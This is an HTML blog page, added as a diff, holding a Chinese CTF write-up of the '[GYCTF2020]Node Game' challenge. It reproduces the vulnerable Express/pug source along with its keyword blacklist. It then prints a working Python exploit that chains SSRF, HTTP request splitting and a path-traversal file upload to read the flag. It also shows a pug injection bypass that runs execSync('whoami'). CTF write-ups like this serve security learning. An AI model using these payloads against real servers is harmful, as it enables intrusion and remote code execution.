@@ -1,0 +1,1009 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  <title>[GYCTF2020]Node Game ~ Xiaotan</title>
+
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
+<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
+<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css"  >
+<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css"  >
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css"  >
+
+<link rel="stylesheet" href="/css/main.css"  >
+
+
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css"  >
+
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="Xiaotan" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>小叹的博客</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/bg_img.jpg')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  Friday, July 31st 2020, 11:40 am
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    846 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      4 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p>最近总是遇到Node.js的题目可是我都不会</p>
+<p>下面是这题的源码：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>var express = require(‘express’);</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td>var app = express();</td>
+</tr>
+<tr>
+<td></td>
+<td>var fs = require(‘fs’);</td>
+</tr>
+<tr>
+<td></td>
+<td>var path = require(‘path’);</td>
+</tr>
+<tr>
+<td></td>
+<td>var http = require(‘http’);</td>
+</tr>
+<tr>
+<td></td>
+<td>var pug = require(‘pug’);</td>
+</tr>
+<tr>
+<td></td>
+<td>var morgan = require(‘morgan’);</td>
+</tr>
+<tr>
+<td></td>
+<td>const multer = require(‘multer’);</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>app.use(multer({dest: ‘./dist’}).array(‘file’));</td>
+</tr>
+<tr>
+<td></td>
+<td>app.use(morgan(‘short’));</td>
+</tr>
+<tr>
+<td></td>
+<td>app.use(“/uploads”,express.static(path.join(__dirname, ‘/uploads’)))</td>
+</tr>
+<tr>
+<td></td>
+<td>app.use(“/template”,express.static(path.join(__dirname, ‘/template’)))</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>app.get(‘/‘, function(req, res) {</td>
+</tr>
+<tr>
+<td></td>
+<td>var action = req.query.action?req.query.action:”index”;</td>
+</tr>
+<tr>
+<td></td>
+<td>if( action.includes(“/“) || action.includes(“\“) ){</td>
+</tr>
+<tr>
+<td></td>
+<td>res.send(“Errrrr, You have been Blocked”);</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>file = path.join(__dirname + ‘/template/‘+ action +’.pug’);</td>
+</tr>
+<tr>
+<td></td>
+<td>var html = pug.renderFile(file);</td>
+</tr>
+<tr>
+<td></td>
+<td>res.send(html);</td>
+</tr>
+<tr>
+<td></td>
+<td>});</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>app.post(‘/file_upload’, function(req, res){</td>
+</tr>
+<tr>
+<td></td>
+<td>var ip = req.connection.remoteAddress;</td>
+</tr>
+<tr>
+<td></td>
+<td>var obj = {</td>
+</tr>
+<tr>
+<td></td>
+<td>msg: ‘’,</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>if (!ip.includes(‘127.0.0.1’)) {</td>
+</tr>
+<tr>
+<td></td>
+<td>obj.msg=”only admin’s ip can use it”</td>
+</tr>
+<tr>
+<td></td>
+<td>res.send(JSON.stringify(obj));</td>
+</tr>
+<tr>
+<td></td>
+<td>return</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>fs.readFile(req.files[0].path, function(err, data){</td>
+</tr>
+<tr>
+<td></td>
+<td>if(err){</td>
+</tr>
+<tr>
+<td></td>
+<td>obj.msg = ‘upload failed’;</td>
+</tr>
+<tr>
+<td></td>
+<td>res.send(JSON.stringify(obj));</td>
+</tr>
+<tr>
+<td></td>
+<td>}else{</td>
+</tr>
+<tr>
+<td></td>
+<td>var file_path = ‘/uploads/‘ + req.files[0].mimetype +”/“;</td>
+</tr>
+<tr>
+<td></td>
+<td>var file_name = req.files[0].originalname</td>
+</tr>
+<tr>
+<td></td>
+<td>var dir_file = __dirname + file_path + file_name</td>
+</tr>
+<tr>
+<td></td>
+<td>if(!fs.existsSync(__dirname + file_path)){</td>
+</tr>
+<tr>
+<td></td>
+<td>try {</td>
+</tr>
+<tr>
+<td></td>
+<td>fs.mkdirSync(__dirname + file_path)</td>
+</tr>
+<tr>
+<td></td>
+<td>} catch (error) {</td>
+</tr>
+<tr>
+<td></td>
+<td>obj.msg = “file type error”;</td>
+</tr>
+<tr>
+<td></td>
+<td>res.send(JSON.stringify(obj));</td>
+</tr>
+<tr>
+<td></td>
+<td>return</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>try {</td>
+</tr>
+<tr>
+<td></td>
+<td>fs.writeFileSync(dir_file,data)</td>
+</tr>
+<tr>
+<td></td>
+<td>obj = {</td>
+</tr>
+<tr>
+<td></td>
+<td>msg: ‘upload success’,</td>
+</tr>
+<tr>
+<td></td>
+<td>filename: file_path + file_name</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>} catch (error) {</td>
+</tr>
+<tr>
+<td></td>
+<td>obj.msg = ‘upload failed’;</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>res.send(JSON.stringify(obj));</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>})</td>
+</tr>
+<tr>
+<td></td>
+<td>})</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>app.get(‘/source’, function(req, res) {</td>
+</tr>
+<tr>
+<td></td>
+<td>res.sendFile(path.join(__dirname + ‘/template/source.txt’));</td>
+</tr>
+<tr>
+<td></td>
+<td>});</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>app.get(‘/core’, function(req, res) {</td>
+</tr>
+<tr>
+<td></td>
+<td>var q = req.query.q;</td>
+</tr>
+<tr>
+<td></td>
+<td>var resp = “”;</td>
+</tr>
+<tr>
+<td></td>
+<td>if (q) {</td>
+</tr>
+<tr>
+<td></td>
+<td>var url = ‘<a href="http://localhost:8081/source?&#39;" target="_blank" rel="noopener">http://localhost:8081/source?&#39;</a> + q</td>
+</tr>
+<tr>
+<td></td>
+<td>console.log(url)</td>
+</tr>
+<tr>
+<td></td>
+<td>var trigger = blacklist(url);</td>
+</tr>
+<tr>
+<td></td>
+<td>if (trigger === true) {</td>
+</tr>
+<tr>
+<td></td>
+<td>res.send(“<p>error occurs!</p>“);</td>
+</tr>
+<tr>
+<td></td>
+<td>} else {</td>
+</tr>
+<tr>
+<td></td>
+<td>try {</td>
+</tr>
+<tr>
+<td></td>
+<td>http.get(url, function(resp) {</td>
+</tr>
+<tr>
+<td></td>
+<td>resp.setEncoding(‘utf8’);</td>
+</tr>
+<tr>
+<td></td>
+<td>resp.on(‘error’, function(err) {</td>
+</tr>
+<tr>
+<td></td>
+<td>if (err.code === “ECONNRESET”) {</td>
+</tr>
+<tr>
+<td></td>
+<td>console.log(“Timeout occurs”);</td>
+</tr>
+<tr>
+<td></td>
+<td>return;</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>});</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>resp.on(‘data’, function(chunk) {</td>
+</tr>
+<tr>
+<td></td>
+<td>try {</td>
+</tr>
+<tr>
+<td></td>
+<td>resps = chunk.toString();</td>
+</tr>
+<tr>
+<td></td>
+<td>res.send(resps);</td>
+</tr>
+<tr>
+<td></td>
+<td>}catch (e) {</td>
+</tr>
+<tr>
+<td></td>
+<td>res.send(e.message);</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>}).on(‘error’, (e) =&gt; {</td>
+</tr>
+<tr>
+<td></td>
+<td>res.send(e.message);});</td>
+</tr>
+<tr>
+<td></td>
+<td>});</td>
+</tr>
+<tr>
+<td></td>
+<td>} catch (error) {</td>
+</tr>
+<tr>
+<td></td>
+<td>console.log(error);</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>} else {</td>
+</tr>
+<tr>
+<td></td>
+<td>res.send(“search param ‘q’ missing!”);</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>})</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>function blacklist(url) {</td>
+</tr>
+<tr>
+<td></td>
+<td>var evilwords = [“global”, “process”,”mainModule”,”require”,”root”,”child_process”,”exec”,”&quot;“,”‘“,”!”];</td>
+</tr>
+<tr>
+<td></td>
+<td>var arrayLen = evilwords.length;</td>
+</tr>
+<tr>
+<td></td>
+<td>for (var i = 0; i &lt; arrayLen; i++) {</td>
+</tr>
+<tr>
+<td></td>
+<td>const trigger = url.includes(evilwords[i]);</td>
+</tr>
+<tr>
+<td></td>
+<td>if (trigger === true) {</td>
+</tr>
+<tr>
+<td></td>
+<td>return true</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>var server = app.listen(8081, function() {</td>
+</tr>
+<tr>
+<td></td>
+<td>var host = server.address().address</td>
+</tr>
+<tr>
+<td></td>
+<td>var port = server.address().port</td>
+</tr>
+<tr>
+<td></td>
+<td>console.log(“Example app listening at http://%s:%s”, host, port)</td>
+</tr>
+<tr>
+<td></td>
+<td>})</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>可以看见这题有SSRF和任意文件上传</p>
+<pre><code class="javascript">app.get(&#39;/&#39;, function(req, res) {
+    var action = req.query.action?req.query.action:&quot;index&quot;;
+    if( action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;) ){
+        res.send(&quot;Errrrr, You have been Blocked&quot;);
+    }
+    file = path.join(__dirname + &#39;/template/&#39;+ action +&#39;.pug&#39;);
+    var html = pug.renderFile(file);
+    res.send(html);
+});</code></pre>
+<p>看到首页接受了一个action参数，会将我们上传到/template/目录下的文件pug渲染。并且返回值。这样的话我们思路大致就清晰了：<br> 还是通过core进行ssrf并伪造文件上传的http包访问到/flag。之后直接首页文件包含触发渲染，就可以访问到内容。</p>
+<p>这里是构造头：</p>
+<pre><code class="cpp">Content-Type: /../template（因为var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;）
+Content-Length:292
+Connection:keep-alive</code></pre>
+<p>然后用一下网上的payload：（写不来呜呜）</p>
+<p><code>import urllib.parse</code></p>
+<p><code>import requests</code></p>
+<p><code>payload = &#39;&#39;&#39; HTTP/1.1</code></p>
+<p><code>POST /file_upload HTTP/1.1</code></p>
+<p><code>Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810</code></p>
+<p><code>Content-Length: 291</code></p>
+<p><code>----------------------------919695033422425209299810</code></p>
+<p><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;abc.pug&quot;</code></p>
+<p><code>Content-Type: ../template</code></p>
+<p><code>doctype html</code></p>
+<p><code>html</code></p>
+<p> <code>head</code></p>
+<p>  <code>style</code></p>
+<p>   <code>include ../../../../../../../flag.txt</code></p>
+<p><code>----------------------------919695033422425209299810--</code></p>
+<p><code>GET /flag HTTP/1.1</code></p>
+<p><code>x:&#39;&#39;&#39;</code></p>
+<p><code>payload = payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)</code></p>
+<p><code>payload = &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)</code></p>
+<p><code>r = requests.get(&#39;http://07a0e2fe-ea38-49d6-8b00-b7e3261e9171.node3.buuoj.cn/core?q=&#39; + urllib.parse.quote(payload))</code></p>
+<p><code>print(r.text)</code></p>
+<p>访问/?action=abc得到flag</p>
+<p>bypass命令执行<br>出题人writeup<br><code>https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-gamev</code><br>是通过对参数URL编码绕过。<br>当然还能通过字符串拼接的方式绕过</p>
+<pre><code>-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;whoami&#39;).toString()&quot;)
+-return x</code></pre>
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+            
+            </p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      
+
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
+  
+  <br>
+
+
+
+    
+
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js" ></script>
+<script src="/lib/popper/popper.min.js" ></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
+<script src="/js/main.js" ></script>
+
+
+  <script src="/js/lazyload.js" ></script>
+
+
+
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
+
+
+  <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+<!-- Plugins -->
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+  <script src="/lib/prettify/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="/lib/typed/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "[GYCTF2020]Node Game&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+  
+    <script type="text/javascript">
+      //定义获取词语下标
+      var a_idx = 0;
+      jQuery(document).ready(function ($) {
+        //点击body时触发事件
+        $("body").click(function (e) {
+          //需要显示的词语
+          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
+          //设置词语给span标签
+          var $i = $("<span/>").text(a[a_idx]);
+          //下标等于原来下标+1  余 词语总数
+          a_idx = (a_idx + 1) % a.length;
+          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
+          //获取x和y的指针坐标
+          var x = e.pageX, y = e.pageY;
+          //在鼠标的指针的位置给$i定义的span标签添加css样式
+          $i.css({
+            "z-index": 999,
+            "top": y - 20,
+            "left": x,
+            "position": "absolute",
+            "font-weight": "bold",
+            "color": rand_color()
+          });
+          // 随机颜色
+          function rand_color() {
+            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+          }
+          //在body添加这个标签
+          $("body").append($i);
+          //animate() 方法执行 CSS 属性集的自定义动画。
+          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
+          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
+          $i.animate({
+            //将原来的位置向上移动180
+            "top": y - 180,
+            "opacity": 0
+            //1500动画的速度
+          }, 1500, function () {
+            //时间到了自动删除
+            $i.remove();
+          });
+        });
+      })
+      ;
+    </script>
+  
+
+
+
+
+
+
+
+</body>
+</html>
